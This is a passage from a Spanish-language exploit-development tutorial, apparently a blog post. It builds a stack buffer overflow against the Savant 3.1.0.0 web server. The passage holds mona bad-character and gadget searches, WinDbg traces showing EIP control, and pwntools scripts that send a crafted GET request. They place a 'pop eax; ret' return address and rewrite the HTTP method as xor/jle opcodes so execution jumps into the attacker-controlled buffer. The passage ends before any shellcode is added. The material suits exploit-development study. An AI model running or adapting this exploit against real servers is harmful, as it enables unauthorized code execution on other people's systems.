badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s">"  </span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span>
</code></pre></div></div><br>

<p class="plain-text">Ahora al enviar el exploit el programa corrompe y volvemos a tener el control del <code class="language-plaintext highlighter-rouge">eip</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(5c0.d58): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=ffffffff ebx=022b2ca0 ecx=8e527088 edx=00000000 esi=022b2ca0 edi=0041703c  
eip=42424242 esp=043fea1c ebp=4242fffe iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202  
42424242 ??              ???</span>
</code></pre></div></div><br>

<p class="plain-text">Sabemos que el pintero en <code class="language-plaintext highlighter-rouge">esp + 4</code> apunta al inicio de nuestro input, si a ese puntero le aumentamos <code class="language-plaintext highlighter-rouge">0x19</code> llegamos a la ruta donde se encuentra nuestro payload</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db poi(esp + 4)
043fea74  47 45 54 00 00 00 00 00-00 00 00 00 00 00 00 00  GET.............
043fea84  00 00 00 00 00 00 00 00-2f 01 02 03 04 05 06 07  ......../.......
043fea94  08 09 0b 0c 0e 0f 10 11-12 13 14 15 16 17 18 19  ................
043feaa4  1a 1b 1c 1d 1e 1f 20 21-22 23 24 25 26 27 28 29  ...... !"#$%&'()
043feab4  2a 2b 2c 2d 2e 2f 30 31-32 33 34 35 36 37 38 39  *+,-./0123456789
043feac4  3a 3b 3c 3d 3e 3f 40 41-42 43 44 45 46 47 48 49  :;<=>?@ABCDEFGHI
043fead4  4a 4b 4c 4d 4e 4f 50 51-52 53 54 55 56 57 58 59  JKLMNOPQRSTUVWXY
043feae4  5a 5b 5c 5d 5e 5f 60 61-62 63 64 65 66 67 68 69  Z[\]^_`abcdefghi

</span><span class="ro">0:000> </span><span class="p">db poi(esp + 4) + 0x19
043fea8d  01 02 03 04 05 06 07 08-09 0b 0c 0e 0f 10 11 12  ................
043fea9d  13 14 15 16 17 18 19 1a-1b 1c 1d 1e 1f 20 21 22  ............. !"
043feaad  23 24 25 26 27 28 29 2a-2b 2c 2d 2e 2f 30 31 32  #$%&'()*+,-./012
043feabd  33 34 35 36 37 38 39 3a-3b 3c 3d 3e 3f 40 41 42  3456789:;<=>?@AB
043feacd  43 44 45 46 47 48 49 4a-4b 4c 4d 4e 4f 50 51 52  CDEFGHIJKLMNOPQR
043feadd  53 54 55 56 57 58 59 5a-5b 5c 5d 5e 5f 60 61 62  STUVWXYZ[\]^_`ab
043feaed  63 64 65 66 67 68 69 6a-6b 6c 6d 6e 6f 70 71 72  cdefghijklmnopqr
043feafd  73 74 75 76 77 78 79 7a-7b 7c 7d 7e 7f 80 81 82  stuvwxyz{|}~....</span>
</code></pre></div></div><br>

<p class="plain-text">Al comparar los bytes del <code class="language-plaintext highlighter-rouge">.bin</code> con la dirección calculada podemos ver que no se ha modificado por lo que los <code class="language-plaintext highlighter-rouge">3</code> badchars que detectamos son los unicos existentes</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">? poi(esp + 4) + 0x19
Evaluate expression: 71297677 = 043fea8d

</span><span class="ro">0:000></span><span class="p"> !py mona compare -f bytearray.bin -a 0x043fea8d
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py compare -f bytearray.bin -a 0x043fea8d  </span><span class="p">
[+] Reading file C:\mona\bytearray.bin...
    Read 253 bytes from file
[+] Preparing output file 'compare.txt'
    - (Re)setting logfile C:\mona\compare.txt
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
[+] C:\mona\bytearray.bin has been recognized as RAW bytes.
[+] Fetched 253 bytes successfully from C:\mona\bytearray.bin
    - Comparing 1 location(s)
Comparing bytes from file with memory :
0x043fea8d | [+] Comparing with memory at location : 0x043fea8d (Stack)
0x043fea8d | !!! Hooray, normal shellcode unmodified !!!
0x043fea8d | Bytes omitted from input: 00 0a 0d</span>
</code></pre></div></div><br>

</section>

<section class="post" id="opcode">
<br><h3 class="post-title">6.4 - Find Opcode</h3><br>

<p class="plain-text">Repasemos, en <code class="language-plaintext highlighter-rouge">esp + 4</code> se encuentra el puntero hacia el inicio de la petición por lo que para retornar a esa dirección tenemos un par de opciones para buscar un gadget</p>
<p class="plain-text">• <code class="language-plaintext highlighter-rouge">pop ???; ret;</code>: Eliminara 4 bytes en el primer pop para guardarlo en el registro y al ejecutar el ret saltará hacia el inicio de la petición.</p>
<p class="plain-text">• <code class="language-plaintext highlighter-rouge">add esp, 4; ret;</code>: Parecido al anterior solo que en lugar de guardar 1 dwords en registros hace que el puntero al stack aumente en 4 bytes para ejecutar el ret.</p><br>

<p class="plain-text">Para encontrar un gadget que ejecute algunas de estas instrucciones primero necesitamos saber que <code class="language-plaintext highlighter-rouge">modulos</code> carga el programa que pertenezcan a el y no al sistema para esto podemos usar mona, solo hay <code class="language-plaintext highlighter-rouge">1</code> modulo pero con un pequeño detalle, inicia con <code class="language-plaintext highlighter-rouge">0x00</code> y esto es un badchar sin embargo como es el <code class="language-plaintext highlighter-rouge">final</code> del payload no nos importa que corte lo que esta delante por lo que podemos usarlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona modules -cm os=false
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py modules -cm os=false

---------- Mona command started on 2024-02-28 18:15:48 (v2.0, rev 635) ----------
[+] Processing arguments and criteria
    - Pointer access level : X
    - Module criteria : ['os=false']
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
----------------------------------------------------------------------------------------------------------------------------------------------  
 Module info :
----------------------------------------------------------------------------------------------------------------------------------------------  
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | CFG   | NXCompat | OS Dll | Version, Modulename & Path, DLLCharacteristics
----------------------------------------------------------------------------------------------------------------------------------------------  
 0x00400000 | 0x00452000 | 0x00052000 | False  | False   | False | False |  False   | False  | 3.1.0.0 [Savant.exe] (Savant.exe) 0x0
----------------------------------------------------------------------------------------------------------------------------------------------  

[+] Preparing output file 'modules.txt'
    - (Re)setting logfile C:\mona\modules.txt</span>
</code></pre></div></div><br>

<p class="plain-text">El gadget que usaremos sera <code class="language-plaintext highlighter-rouge">pop eax</code> para quitar 4 bytes y <code class="language-plaintext highlighter-rouge">ret</code> para retornar al puntero, obtenemos el opcode y buscamos dentro del modulo <code class="language-plaintext highlighter-rouge">Savant.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">!py mona asm -s 'pop eax # ret'
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py asm -s 'pop eax # ret'
Opcode results : 
---------------- 
 pop eax = \x58
 ret = \xc3
 Full opcode : \x58\xc3 

</span><span class="ro">0:000> </span><span class="p">!py mona find -s '\x58\xc3' -m savant.exe
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py find -s '\x58\xc3' -m savant.exe

---------- Mona command started on 2024-02-28 18:16:38 (v2.0, rev 635) ----------
[+] Processing arguments and criteria
    - Pointer access level : *
    - Only querying modules savant.exe
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
    - Treating search pattern as bin
[+] Searching from 0x00400000 to 0x00452000
[+] Preparing output file 'find.txt'
    - (Re)setting logfile C:\mona\find.txt
[+] Writing results to C:\mona\find.txt
    - Number of pointers of type ''\x58\xc3'' : 19 
[+] Results : 
0x00418674 |   0x00418674 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041924f |   0x0041924f : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x004194f6 |   0x004194f6 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x00419613 |   0x00419613 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041a531 |   0x0041a531 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041af7f |   0x0041af7f : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041b464 |   0x0041b464 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041b9fa |   0x0041b9fa : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041ba2e |   0x0041ba2e : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041c49a |   0x0041c49a : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041cc30 |   0x0041cc30 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041cce4 |   0x0041cce4 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041eb74 |   0x0041eb74 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041fe21 |   0x0041fe21 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x0041fe7e |   0x0041fe7e : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
0x00420904 |   0x00420904 : '\x58\xc3' | startnull,ascii {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0  
0x00420a1d |   0x00420a1d : '\x58\xc3' | startnull,ascii {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0  
0x00420e69 |   0x00420e69 : '\x58\xc3' | startnull,ascii {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0  
0x00420ed8 |   0x00420ed8 : '\x58\xc3' | startnull {PAGE_EXECUTE_READ} [Savant.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v3.1.0.0 (Savant.exe), 0x0
    Found a total of 19 pointers</span>
</code></pre></div></div><br>

<p class="plain-text">Enviaremos <code class="language-plaintext highlighter-rouge">A's</code> hasta antes de sobrescribir el eip donde estara un <code class="language-plaintext highlighter-rouge">pop eax; ret;</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

ret </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x00418674</span><span class="p">)

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret

content </span><span class="o">= </span><span class="no">b</span><span class="s">"GET /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">  

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Establecemos un breakpoint en la dirección del gadget y corremos el exploit anterior</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp 0x00418674

</span><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=00000000 ebx=020c2ca0 ecx=0000000e edx=0428e508 esi=020c2ca0 edi=0041703c  
eip=00418674 esp=0428ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18674:
00418674 58              pop     eax</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">pop eax; ret;</code> el programa retorna al inicio de la petición por lo que intentará ejecutar la string del metodo <code class="language-plaintext highlighter-rouge">GET</code> como instrucciones ensamblador</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000000 ebx=020c2ca0 ecx=0000000e edx=0428e508 esi=020c2ca0 edi=0041703c  
eip=00418674 esp=0428ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18674:
00418674 58              pop     eax

</span><span class="ro">0:000> </span><span class="p">p
eax=0428fe60 ebx=020c2ca0 ecx=0000000e edx=0428e508 esi=020c2ca0 edi=0041703c  
eip=00418675 esp=0428ea20 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18675:
00418675 c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=0428fe60 ebx=020c2ca0 ecx=0000000e edx=0428e508 esi=020c2ca0 edi=0041703c  
eip=0428ea74 esp=0428ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
0428ea74 47              inc     edi

</span><span class="ro">0:000> </span><span class="p">db eip
0428ea74  47 45 54 00 00 00 00 00-00 00 00 00 00 00 00 00  GET.............
0428ea84  00 00 00 00 00 00 00 00-2f 41 41 41 41 41 41 41  ......../AAAAAAA
0428ea94  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0428eaa4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0428eab4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0428eac4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0428ead4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0428eae4  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span>
</code></pre></div></div><br>

<p class="plain-text">Sabemos que <code class="language-plaintext highlighter-rouge">0x19</code> bytes mas adelante se encuentra la ruta de la petición que equivale al inicio de nuestras <code class="language-plaintext highlighter-rouge">A's</code> por lo que si ejecutamos los 3 bytes de la string <code class="language-plaintext highlighter-rouge">GET</code> como ensamblador despues ejecutará <code class="language-plaintext highlighter-rouge">null</code> bytes y corromperá el programa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">db eip + 0x19
0428ea8d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428ea9d  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428eaad  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428eabd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428eacd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428eadd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428eaed  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
0428eafd  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  </span>
</code></pre></div></div><br>

<p class="plain-text">Ya que lo que ejecutamos es la string del metodo como instreuccion modificamos el metodo de <code class="language-plaintext highlighter-rouge">GET</code> al opcode de un <code class="language-plaintext highlighter-rouge">jmp</code> corto para saltar los <code class="language-plaintext highlighter-rouge">0x19</code> bytes necesitados</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, p32, asm

offset </span><span class="o">= </span><span class="mi">253</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

ret </span><span class="o">= </span><span class="p">p32(</span><span class="mi">0x00418674</span><span class="p">)

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">ret

method </span><span class="o">= </span><span class="p">asm(</span><span class="s">"jmp $+0x19"</span><span class="p">)

content </span><span class="o">= </span><span class="p">method </span><span class="o">+ </span><span class="no">b</span><span class="s">" /" </span><span class="o">+ </span><span class="p">payload </span><span class="o">+ </span><span class="no">b</span><span class="s">"</span><span class="mi">\r\n\r\n</span><span class="s">"</span><span class="p">  

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">80</span><span class="p">)
shell.sendline(content)</span>
</code></pre></div></div><br>

<p class="plain-text">Sin embargo al ejecutar el <code class="language-plaintext highlighter-rouge">ret</code> en lugar de ejecutar un <code class="language-plaintext highlighter-rouge">jmp</code> corto intenta ejecutar <code class="language-plaintext highlighter-rouge">retf</code> esto pasa porque en lugar de escribir <code class="language-plaintext highlighter-rouge">\xeb\x17</code> que equivale a <code class="language-plaintext highlighter-rouge">jmp $+0x19</code> escribió <code class="language-plaintext highlighter-rouge">\xcb\x17</code>, esto es extraño porque no estamos escribiendo ningun badchar pero por alguna razón cambia un <code class="language-plaintext highlighter-rouge">byte</code>, entonces necesitamos buscar alternativas</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=00000000 ebx=02372ca0 ecx=0000000e edx=0428e508 esi=02372ca0 edi=0041703c  
eip=00418674 esp=0428ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18674:
00418674 58              pop     eax

</span><span class="ro">0:000> </span><span class="p">p
eax=0428fe60 ebx=02372ca0 ecx=0000000e edx=0428e508 esi=02372ca0 edi=0041703c  
eip=00418675 esp=0428ea20 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18675:
00418675 c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=0428fe60 ebx=02372ca0 ecx=0000000e edx=0428e508 esi=02372ca0 edi=0041703c  
eip=0428ea74 esp=0428ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
0428ea74 cb              retf

</span><span class="ro">0:000> </span><span class="p">dd eip L1
0428ea74  000017cb</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos intentar en lugar de un simple <code class="language-plaintext highlighter-rouge">jmp</code> usar un jmp condicional para cambiar el opcode, para ello usaremos <code class="language-plaintext highlighter-rouge">je</code> tambien llamado <code class="language-plaintext highlighter-rouge">jz</code> que salta si la flag <code class="language-plaintext highlighter-rouge">zf</code> se activa, para activarlo usaremos <code class="language-plaintext highlighter-rouge">xor eax, eax</code> que da como resultado <code class="language-plaintext highlighter-rouge">0</code> y lo activa, pero como este opcode pesa <code class="language-plaintext highlighter-rouge">2</code> bytes bajaremos el salto de <code class="language-plaintext highlighter-rouge">0x19</code> a solo <code class="language-plaintext highlighter-rouge">0x17</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">method </span><span class="o"> = </span><span class="no">b</span><span class="s">""</span><span class="p">
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor eax, eax"</span><span class="p">)
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"je $+0x17"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Pero ¡oh sorpresa!, intenta ejecutar la instrucción <code class="language-plaintext highlighter-rouge">push esp</code>, ¿porque?, similar a lo anterior el programa cambio los bytes del opcode <code class="language-plaintext highlighter-rouge">\x74\x15</code> a los bytes <code class="language-plaintext highlighter-rouge">\x54\x15</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=00000000 ebx=006e2ca0 ecx=0000000e edx=0430e508 esi=006e2ca0 edi=0041703c  
eip=00418674 esp=0430ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18674:
00418674 58              pop     eax

</span><span class="ro">0:000> </span><span class="p">p
eax=0430fe60 ebx=006e2ca0 ecx=0000000e edx=0430e508 esi=006e2ca0 edi=0041703c  
eip=00418675 esp=0430ea20 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
Savant+0x18675:
00418675 c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=0430fe60 ebx=006e2ca0 ecx=0000000e edx=0430e508 esi=006e2ca0 edi=0041703c  
eip=0430ea74 esp=0430ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202  
0430ea74 31c0            xor     eax,eax

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=006e2ca0 ecx=0000000e edx=0430e508 esi=006e2ca0 edi=0041703c  
eip=0430ea76 esp=0430ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
0430ea76 54              push    esp

</span><span class="ro">0:000> </span><span class="p">dd eip L1
0430ea76  00001554</span>
</code></pre></div></div><br>

<p class="plain-text">Después de probar multiples <a href="https://faydoc.tripod.com/cpu/jle.htm">jmps condicionales</a> encontramos uno que funciona y es <code class="language-plaintext highlighter-rouge">jle</code>, que salta si la flag <code class="language-plaintext highlighter-rouge">zf</code> esta activada o si la flag <code class="language-plaintext highlighter-rouge">sf</code> no es igual a la flag <code class="language-plaintext highlighter-rouge">of</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">method </span><span class="o"> = </span><span class="no">b</span><span class="s">""</span><span class="p">
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"xor eax, eax"</span><span class="p">)
method </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"jle $+0x17"</span><span class="p">)</span>
</code></pre></div></div><br>

<p class="plain-text">Controlamos la condicion activando la flag <code class="language-plaintext highlighter-rouge">zf</code> con el <code class="language-plaintext highlighter-rouge">xor eax, eax</code>, esta vez los bytes no cambian y la instrucción es un <code class="language-plaintext highlighter-rouge">jle</code> a <code class="language-plaintext highlighter-rouge">0x0427ea8d</code> y la condicion se cumple</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=00000000 ebx=00482ca0 ecx=0000000e edx=0427e508 esi=00482ca0 edi=0041703c
eip=00418674 esp=0427ea1c ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
Savant+0x18674:
00418674 58              pop     eax

</span><span class="ro">0:000> </span><span class="p">p
eax=0427fe60 ebx=00482ca0 ecx=0000000e edx=0427e508 esi=00482ca0 edi=0041703c
eip=00418675 esp=0427ea20 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
Savant+0x18675:
00418675 c3              ret

</span><span class="ro">0:000> </span><span class="p">p
eax=0427fe60 ebx=00482ca0 ecx=0000000e edx=0427e508 esi=00482ca0 edi=0041703c
eip=0427ea74 esp=0427ea24 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
0427ea74 31c0            xor     eax,eax

</span><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=00482ca0 ecx=0000000e edx=0427e508 esi=00482ca0 edi=0041703c
eip=0427ea76 esp=0427ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
0427ea76 7e15            jle     0427ea8d                                [br=1]  </span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el <code class="language-plaintext highlighter-rouge">jle</code> saltamos los <code class="language-plaintext highlighter-rouge">0x17</code> bytes al inicio de las <code class="language-plaintext highlighter-rouge">A's</code> sin embargo aunque ejecutamos esas A's como instrucciones y tenemos más espacio solo podemos escribir <code class="language-plaintext highlighter-rouge">253</code> bytes que aun no es suficiente para un <code class="language-plaintext highlighter-rouge">shellcode</code> de msfvenom</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=00000000 ebx=00482ca0 ecx=0000000e edx=0427e508 esi=00482ca0 edi=0041703c  
eip=0427ea8d esp=0427ea24 ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
